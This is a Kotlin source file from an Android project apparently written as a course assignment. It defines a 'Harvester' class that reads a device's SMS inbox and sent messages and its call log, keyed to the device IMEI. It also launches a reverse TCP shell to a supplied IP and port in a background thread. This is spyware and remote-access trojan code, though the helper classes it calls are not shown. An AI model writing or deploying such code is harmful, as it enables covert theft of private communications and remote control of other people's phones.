package com.example.assignment1

import android.app.Activity
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import com.example.assignment1.DataRetriever.CallLog
import com.example.assignment1.DataRetriever.smsLog
import kotlin.concurrent.thread

class Harvester(var activity: Activity, var context: Context, var imei: String) {

    fun getSMS(){
        smsLog(context, imei).readSMSBox("inbox")
        smsLog(context, imei).readSMSBox("sent")
    }

    fun getCallLog(){
        CallLog(context, activity, imei).readLogs()
    }

    fun getShell(ip: String, port: Int){
        thread(start = true){
            reverseShell.reverse_tcp(ip, port)
        }

    }
}